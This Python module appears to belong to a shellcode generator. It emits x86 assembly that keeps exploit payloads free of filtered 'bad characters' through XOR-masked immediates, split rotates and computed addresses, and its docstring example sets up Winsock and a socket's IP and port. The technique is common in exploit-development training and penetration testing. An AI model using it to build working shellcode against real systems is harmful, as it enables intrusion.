"""Badchar-safe immediate value encoding for x86 payload templates.

When a 32-bit or 16-bit constant contains bytes in the manifest badchar set,
those bytes cannot appear in the assembled shellcode. This module provides
helpers that substitute a (value XOR mask) / XOR-back pair where both the
encoded value and the mask are free of badchars.

Typical usage in a template:

    from ..encode import encode_dword, encode_word, safe_push_word_as_dword

    return "\\n".join([
        ...
        *safe_push_word_as_dword(0x0202, config.badchars),   # WSAStartup ver
        ...
        "    xor  eax, eax",
        *encode_word(port_be, config.badchars, "ax"),
        "    mov  word ptr [edi+0x02], ax",
        *encode_dword(ip_be, config.badchars, "eax"),
        "    mov  dword ptr [edi+0x04], eax",
        ...
    ])
"""
from __future__ import annotations


def _disp_bytes(offset: int) -> list[int]:
    """Return the actual displacement bytes nasm will emit for a given offset.

    For offsets -128..+127, nasm uses a single signed byte (disp8).
    For larger offsets, nasm uses 4 bytes (disp32, little-endian, signed).
    """
    if -128 <= offset <= 127:
        return [(offset & 0xFF)]
    as_unsigned = offset & 0xFFFFFFFF
    return [(as_unsigned >> (8 * i)) & 0xFF for i in range(4)]


def _disp_has_badchar(offset: int, badchars: set[int]) -> bool:
    """Check if any displacement byte for offset contains a badchar.

    Offset 0 emits no displacement byte (nasm uses [reg] directly).
    """
    if offset == 0:
        return False
    return any(b in badchars for b in _disp_bytes(offset))


def _has_badchar(value: int, nbytes: int, badchars: set[int]) -> bool:
    """Check if any byte of the value (little-endian unsigned) is in badchars."""
    return any(((value >> (8 * i)) & 0xFF) in badchars for i in range(nbytes))


def _find_mask_byte(v_byte: int, badchars: set[int]) -> int:
    """Return a mask byte m such that m and (v_byte XOR m) are both not in badchars."""
    for m in range(1, 256):
        if m not in badchars and (v_byte ^ m) not in badchars:
            return m
    raise ValueError(
        f"Cannot encode byte 0x{v_byte:02x}: no valid mask exists for "
        f"badchar set {sorted(f'0x{b:02x}' for b in badchars)}"
    )


def _fmt_offset(offset: int) -> str:
    """Format a signed offset for assembly: +0xNN or -0xNN, empty for 0."""
    if offset == 0:
        return ""
    if offset > 0:
        return f"+0x{offset:02x}"
    return f"-0x{-offset:02x}"


def encode_dword(value: int, badchars: set[int], reg: str = "eax") -> list[str]:
    """Return assembly lines that load a 32-bit value into reg, free of badchars.

    If the value is already clean, emits a single mov.
    Otherwise emits mov + xor using a computed per-byte mask.
    """
    v_bytes = [(value >> (8 * i)) & 0xFF for i in range(4)]
    if not any(b in badchars for b in v_bytes):
        return [f"    mov  {reg}, 0x{value:08x}"]
    mask_bytes = [_find_mask_byte(b, badchars) for b in v_bytes]
    mask    = sum(m << (8 * i) for i, m in enumerate(mask_bytes))
    encoded = value ^ mask
    return [
        f"    mov  {reg}, 0x{encoded:08x}",
        f"    xor  {reg}, 0x{mask:08x}",
    ]


def encode_word(value: int, badchars: set[int], reg: str = "ax") -> list[str]:
    """Return assembly lines that load a 16-bit value into reg, free of badchars.

    Operates on the lower 16 bits only. When the upper 16 bits of the parent
    register matter, zero it beforehand (e.g. 'xor eax, eax').
    """
    v_bytes = [(value >> (8 * i)) & 0xFF for i in range(2)]
    if not any(b in badchars for b in v_bytes):
        return [f"    mov  {reg}, 0x{value:04x}"]
    mask_bytes = [_find_mask_byte(b, badchars) for b in v_bytes]
    mask    = mask_bytes[0] | (mask_bytes[1] << 8)
    encoded = value ^ mask
    return [
        f"    mov  {reg}, 0x{encoded:04x}",
        f"    xor  {reg}, 0x{mask:04x}",
    ]


def encode_byte(value: int, badchars: set[int], reg: str = "al") -> list[str]:
    """Return assembly lines that load an 8-bit value into reg, free of badchars.

    If the value is clean, emits a single mov.
    Otherwise emits mov + xor using a computed mask byte.
    """
    if value not in badchars:
        return [f"    mov  {reg}, 0x{value:02x}"]
    m = _find_mask_byte(value, badchars)
    return [
        f"    mov  {reg}, 0x{(value ^ m):02x}",
        f"    xor  {reg}, 0x{m:02x}",
    ]


# Register tables used by ModRM-aware helpers below.
_REG_NUM = {
    "eax": 0, "ecx": 1, "edx": 2, "ebx": 3,
    "esp": 4, "ebp": 5, "esi": 6, "edi": 7,
}
_REG16 = {
    "eax": "ax", "ecx": "cx", "edx": "dx", "ebx": "bx",
    "esi": "si", "edi": "di", "esp": "sp", "ebp": "bp",
}


def _modrm_disp8(reg: str, rm_base: str) -> int | None:
    """Return the ModRM byte for mov [rm_base+disp8], reg (or vice versa).

    Returns None when the encoding is unknown (ESP base needs SIB; unknown reg).
    The byte is the same whether reg is a source or destination -- only the
    opcode differs, not the ModRM.
    """
    r = _REG_NUM.get(reg)
    m = _REG_NUM.get(rm_base)
    if r is None or m is None or m == 4:
        return None
    return 0x40 | (r << 3) | m


def safe_push_dword(value: int, badchars: set[int]) -> list[str]:
    """Emit a badchar-safe push of a 32-bit immediate via eax."""
    return [*encode_dword(value, badchars, "eax"), "    push eax"]


def safe_push_word_as_dword(value: int, badchars: set[int]) -> list[str]:
    """Emit a badchar-safe push of a 16-bit value zero-extended to 32 bits.

    Use for constants like MAKEWORD(2,2)=0x0202 which must be pushed as a
    DWORD but whose upper bytes would be null if encoded as push imm32.
    """
    return ["    xor  eax, eax", *encode_word(value, badchars, "ax"), "    push eax"]


def safe_push_imm(value: int, badchars: set[int]) -> list[str]:
    """Emit a badchar-safe push of a small immediate value.

    push imm8 encodes the byte directly in the opcode stream.
    Values 0-127 that are clean use push imm8 directly.
    Zero always goes through xor+push to avoid null bytes.
    """
    if value == 0:
        return ["    xor  eax, eax", "    push eax"]
    if 1 <= value <= 0x7f and value not in badchars:
        return [f"    push 0x{value:x}"]
    return safe_push_dword(value, badchars)


def safe_mem_load(
    dst: str, base: str, offset: int, badchars: set[int],
    *, width: str = "dword", tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe memory load: dst = [base + offset].

    Checks both the displacement bytes and the ModRM byte (e.g. mov eax,
    [ebp-N] always produces ModRM 0x45 regardless of displacement).
    """
    size_prefix = {"word": "word ptr ", "byte": "byte ptr "}
    pfx = size_prefix.get(width, "")
    fmt = _fmt_offset(offset)

    disp_dirty = _disp_has_badchar(offset, badchars)
    modrm_dirty = False
    if not disp_dirty and offset != 0 and -128 <= offset <= 127:
        mb = _modrm_disp8(dst, base)
        modrm_dirty = mb is not None and mb in badchars

    if not disp_dirty and not modrm_dirty:
        return [f"    mov  {dst}, {pfx}[{base}{fmt}]"]

    lines = [*encode_dword(offset & 0xFFFFFFFF, badchars, tmp)]
    lines.append(f"    add  {tmp}, {base}")
    lines.append(f"    mov  {dst}, {pfx}[{tmp}]")
    return lines


def safe_mem_store(
    base: str, offset: int, src: str, badchars: set[int],
    *, width: str = "dword", tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe memory store: [base + offset] = src.

    Checks both the displacement bytes and the ModRM byte (e.g. mov
    [ebp-N], eax always produces ModRM 0x45 regardless of displacement).
    """
    fmt = _fmt_offset(offset)

    disp_dirty = _disp_has_badchar(offset, badchars)
    modrm_dirty = False
    if not disp_dirty and offset != 0 and -128 <= offset <= 127:
        mb = _modrm_disp8(src, base)
        modrm_dirty = mb is not None and mb in badchars

    if not disp_dirty and not modrm_dirty:
        return [f"    mov  [{base}{fmt}], {src}"]

    lines = [*encode_dword(offset & 0xFFFFFFFF, badchars, tmp)]
    lines.append(f"    add  {tmp}, {base}")
    lines.append(f"    mov  [{tmp}], {src}")
    return lines


def _cmp_imm_has_badchar(value: int, badchars: set[int]) -> bool:
    """Check if a cmp immediate's encoded bytes contain badchars.

    nasm uses sign-extended imm8 when the value fits in 0..127 (for cmp r/m16)
    so only the low byte appears in the output. For values > 127, both bytes
    of a 16-bit immediate appear.
    """
    if 0 <= value <= 0x7F:
        return (value & 0xFF) in badchars
    return _has_badchar(value, 2, badchars)


def safe_cmp_word(
    base: str, offset: int, value: int, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe cmp word ptr [base+offset], value.

    Both the offset displacement and the immediate value can contain badchars.
    When the value is dirty, uses the 16-bit sub-register form (dx/cx) for
    xor and cmp to prevent nasm from zero-extending immediates to 32 bits and
    introducing null bytes.  Falls back to sub (opcode 0x2B) instead of cmp
    (opcode 0x3B) to keep the comparison opcode itself out of the output.
    """
    fmt = _fmt_offset(offset)
    offset_dirty = _disp_has_badchar(offset, badchars)
    value_dirty = _cmp_imm_has_badchar(value, badchars)

    if not offset_dirty and not value_dirty:
        return [f"    cmp  word ptr [{base}{fmt}], 0x{value:04x}"]

    lines: list[str] = []

    if offset_dirty:
        lines.extend(encode_dword(offset & 0xFFFFFFFF, badchars, tmp))
        lines.append(f"    add  {tmp}, {base}")
        addr = tmp
    else:
        addr = f"{base}{fmt}"

    if not value_dirty:
        lines.append(f"    cmp  word ptr [{addr}], 0x{value:04x}")
    else:
        lines.append(f"    movzx {tmp}, word ptr [{addr}]")
        m1 = _find_mask_byte(value & 0xFF, badchars)
        m2 = _find_mask_byte((value >> 8) & 0xFF, badchars)
        mask = m1 | (m2 << 8)
        encoded = (value ^ mask) & 0xFFFF
        tmp16 = _REG16.get(tmp, tmp)
        if not _has_badchar(mask, 2, badchars) and not _has_badchar(encoded, 2, badchars):
            # 16-bit form: xor dx, imm16 / cmp dx, imm16 uses 66-prefix + 16-bit
            # immediate -- no 32-bit zero-extension, no null bytes.
            lines.append(f"    xor  {tmp16}, 0x{mask:04x}")
            lines.append(f"    cmp  {tmp16}, 0x{encoded:04x}")
        else:
            # Fallback: encode full value in second register, compare with sub
            # (opcode 0x2B) instead of cmp (opcode 0x3B).
            other = "eax" if tmp != "eax" else "edx"
            lines.extend(encode_dword(value, badchars, other))
            lines.append(f"    sub  {tmp}, {other}")
    return lines


def safe_sub_imm(reg: str, value: int, badchars: set[int], *, tmp: str = "ecx") -> list[str]:
    """Emit a badchar-safe sub reg, imm."""
    if not _disp_has_badchar(value, badchars):
        return [f"    sub  {reg}, 0x{value:02x}"]
    lines = encode_dword(value, badchars, tmp)
    lines.append(f"    sub  {reg}, {tmp}")
    return lines


def safe_add_imm(reg: str, offset: int, badchars: set[int], *, tmp: str = "ecx") -> list[str]:
    """Emit a badchar-safe add reg, imm."""
    if not _disp_has_badchar(offset, badchars):
        return [f"    add  {reg}, 0x{offset:02x}"]
    lines = encode_dword(offset, badchars, tmp)
    lines.append(f"    add  {reg}, {tmp}")
    return lines


def safe_ror_imm(reg: str, value: int, badchars: set[int]) -> list[str]:
    """Emit a badchar-safe ror reg, imm8."""
    if value not in badchars:
        return [f"    ror  {reg}, 0x{value:02x}"]
    for split in range(1, value):
        if split not in badchars and (value - split) not in badchars:
            return [
                f"    ror  {reg}, 0x{split:02x}",
                f"    ror  {reg}, 0x{value - split:02x}",
            ]
    raise ValueError(f"Cannot encode ror imm8 0x{value:02x} with given badchars")


def safe_byte_store(
    base: str, offset: int, value: int, badchars: set[int],
    *, tmp_reg: str = "al", addr_tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe mov byte ptr [base+offset], imm8."""
    lines: list[str] = []
    fmt = _fmt_offset(offset)
    need_encode_val = value in badchars
    offset_dirty = _disp_has_badchar(offset, badchars)

    if need_encode_val:
        lines.extend(encode_byte(value, badchars, tmp_reg))

    src = tmp_reg if need_encode_val else f"0x{value:02x}"

    if not offset_dirty:
        lines.append(f"    mov  byte ptr [{base}{fmt}], {src}")
    else:
        lines.extend(encode_dword(offset & 0xFFFFFFFF, badchars, addr_tmp))
        lines.append(f"    add  {addr_tmp}, {base}")
        lines.append(f"    mov  byte ptr [{addr_tmp}], {src}")
    return lines


def safe_word_store(
    base: str, offset: int, src_reg: str, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe mov word ptr [base+offset], src_reg."""
    fmt = _fmt_offset(offset)
    if not _disp_has_badchar(offset, badchars):
        return [f"    mov  word ptr [{base}{fmt}], {src_reg}"]
    lines = encode_dword(offset & 0xFFFFFFFF, badchars, tmp)
    lines.append(f"    add  {tmp}, {base}")
    lines.append(f"    mov  word ptr [{tmp}], {src_reg}")
    return lines


def safe_dword_store(
    base: str, offset: int, src_reg: str, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe mov dword ptr [base+offset], src_reg."""
    fmt = _fmt_offset(offset)
    if not _disp_has_badchar(offset, badchars):
        return [f"    mov  [{base}{fmt}], {src_reg}"]
    lines = encode_dword(offset & 0xFFFFFFFF, badchars, tmp)
    lines.append(f"    add  {tmp}, {base}")
    lines.append(f"    mov  [{tmp}], {src_reg}")
    return lines


# -- ebp_ref parsing and high-level ref-based helpers ------------------

import re as _re

_EBP_RE = _re.compile(r'\[ebp([+-])(0x[0-9a-fA-F]+)\]')


def parse_ebp_offset(ref: str) -> int:
    """Parse '[ebp-0xNN]' or '[ebp+0xNN]' into a signed integer offset."""
    m = _EBP_RE.match(ref)
    if not m:
        raise ValueError(f"Cannot parse ebp reference: {ref}")
    sign = -1 if m.group(1) == '-' else 1
    return sign * int(m.group(2), 16)


def _safe_addr(base: str, offset: int, badchars: set[int], tmp: str) -> tuple[list[str], str]:
    """Compute effective address, returning (setup_lines, addr_operand).

    If displacement is clean, returns ([], "[base+offset]").
    If dirty, emits code to compute address in tmp, returns (lines, "[tmp]").
    """
    fmt = _fmt_offset(offset)
    if not _disp_has_badchar(offset, badchars):
        return [], f"[{base}{fmt}]"
    lines = list(encode_dword(offset & 0xFFFFFFFF, badchars, tmp))
    lines.append(f"    add  {tmp}, {base}")
    return lines, f"[{tmp}]"


def safe_lea(
    dst: str, base: str, offset: int, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe lea dst, [base+offset]."""
    fmt = _fmt_offset(offset)
    if not _disp_has_badchar(offset, badchars):
        return [f"    lea  {dst}, [{base}{fmt}]"]
    lines = list(encode_dword(offset & 0xFFFFFFFF, badchars, tmp))
    lines.append(f"    add  {tmp}, {base}")
    if tmp != dst:
        lines.append(f"    mov  {dst}, {tmp}")
    return lines


def safe_push_mem(
    base: str, offset: int, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe push dword ptr [base+offset]."""
    setup, addr = _safe_addr(base, offset, badchars, tmp)
    return setup + [f"    push dword ptr {addr}"]


def safe_call_mem(
    base: str, offset: int, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe call dword ptr [base+offset]."""
    setup, addr = _safe_addr(base, offset, badchars, tmp)
    return setup + [f"    call dword ptr {addr}"]


_TMP_CANDIDATES = ("ecx", "edx", "eax")


def _pick_tmp(preferred: str, *conflicts: str) -> str:
    """Return preferred unless it conflicts with any listed register."""
    conflict_set = set(conflicts)
    if preferred not in conflict_set:
        return preferred
    for candidate in _TMP_CANDIDATES:
        if candidate not in conflict_set:
            return candidate
    raise ValueError(f"No scratch register available (conflicts: {conflicts})")


def safe_add_from_mem(
    dst: str, base: str, offset: int, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe add dst, [base+offset]."""
    tmp = _pick_tmp(tmp, dst, base)
    setup, addr = _safe_addr(base, offset, badchars, tmp)
    return setup + [f"    add  {dst}, {addr}"]


def safe_sub_from_mem(
    dst: str, base: str, offset: int, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe sub dst, [base+offset]."""
    tmp = _pick_tmp(tmp, dst, base)
    setup, addr = _safe_addr(base, offset, badchars, tmp)
    return setup + [f"    sub  {dst}, {addr}"]


def safe_add_to_mem(
    base: str, offset: int, src: str, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe add [base+offset], src."""
    tmp = _pick_tmp(tmp, src, base)
    setup, addr = _safe_addr(base, offset, badchars, tmp)
    return setup + [f"    add  {addr}, {src}"]


def safe_cmp_with_mem(
    reg: str, base: str, offset: int, badchars: set[int],
    *, tmp: str = "ecx",
) -> list[str]:
    """Emit a badchar-safe cmp reg, [base+offset]."""
    tmp = _pick_tmp(tmp, reg, base)
    setup, addr = _safe_addr(base, offset, badchars, tmp)
    return setup + [f"    cmp  {reg}, {addr}"]
